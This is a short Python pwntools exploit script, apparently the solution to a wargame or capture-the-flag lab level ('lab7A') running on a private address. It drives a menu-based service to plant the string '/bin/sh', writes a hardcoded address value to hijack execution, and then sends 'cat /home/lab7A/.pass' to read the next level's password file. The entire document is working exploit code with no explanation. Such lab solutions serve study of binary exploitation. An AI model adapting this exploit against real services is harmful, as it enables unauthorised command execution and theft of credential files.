from pwn import *

HOST="192.168.13.101"
PORT=1337

context.clear(arch="i386")

def main():
    r=remote(HOST,PORT)
    r.recvuntil("Enter Choice: ")
    r.sendline("1")
    r.sendline("/bin/sh")
    r.sendline("3")
    r.sendline("2")
    r.sendline("3085316496")
    r.sendline("5")
    r.sendline("1")
    r.recvuntil("String index to print: ")
    r.sendline("cat /home/lab7A/.pass")
    #r.interactive()
    flag=r.recvline()

    log.success("\033[4;31mGot flag \033[0m"+flag)
if __name__=="__main__":
    main()
